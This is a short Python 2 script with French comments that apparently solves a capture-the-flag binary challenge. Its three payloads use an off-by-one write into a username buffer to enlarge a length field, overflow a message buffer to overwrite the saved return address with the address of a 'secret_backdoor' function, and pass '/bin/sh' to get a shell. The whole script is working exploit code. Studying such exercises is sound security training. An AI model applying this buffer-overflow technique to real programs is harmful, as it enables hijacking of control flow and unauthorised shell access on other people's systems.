#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import struct

# Payload 1 : Modifier len via off-by-one overflow
username = "A" * 40         # Remplit username[40]
username += "\xd0"          # Écrase le 1er byte de len (140 → 208)

# Payload 2 : Overflow jusqu'à RIP et l'écraser
message = "B" * 200                          # Padding jusqu'à saved RIP
message += struct.pack('Q', 0x55555555488c)  # Adresse de secret_backdoor

# Payload 3 : Commande pour secret_backdoor()
command = "/bin/sh"

# Génération du payload complet
print(username)
print(message)
print(command)